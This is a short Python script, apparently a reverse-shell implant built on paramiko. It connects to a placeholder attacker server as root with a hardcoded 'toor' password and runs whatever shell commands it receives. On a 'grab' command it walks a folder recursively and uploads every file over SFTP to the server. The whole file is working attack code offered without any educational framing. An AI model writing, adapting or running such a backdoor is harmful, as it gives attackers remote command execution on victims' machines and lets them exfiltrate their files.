import paramiko
import threading
import subprocess
import os


def sftp(local_path,name):
    try:
        transport = paramiko.Transport(('<IPaddress of server>', <SSH port>))
        transport.connect(username = 'root', password = 'toor')
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, '/home/Desktop/SFTP-Upload/'+name)
        sftp.close()
        transport.close()
        return('[+] Done')
    except Exception as e:
        return(str(e))


client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('<IPaddress of server>', <Listening port of server>, username = 'root', password = 'toor')
chan = client.get_transport().open_session()
chan.send('Hey Client connected :) ')
print(chan.recv(1024))


def sendfile(path):     #recurssively checking all folder for only files
    for entity in os.listdir(path):
        full = path + entity
        if os.path.isdir(full):
            sendfile(full+'/')
        elif os.path.isfile(full):
            chan.send(sftp(full, str(entity)))

while True:
    command = chan.recv(1024)
    try:
        if 'grab' in str(command):
            grab,name,path = str(command).split('*')
            sendfile(path[:-1])

        else:
            CMD = subprocess.check_output(command, shell=True)
            chan.send(CMD)
    except Exception as e:
        print("Exception happened")
        chan.send(str(e))


client.close
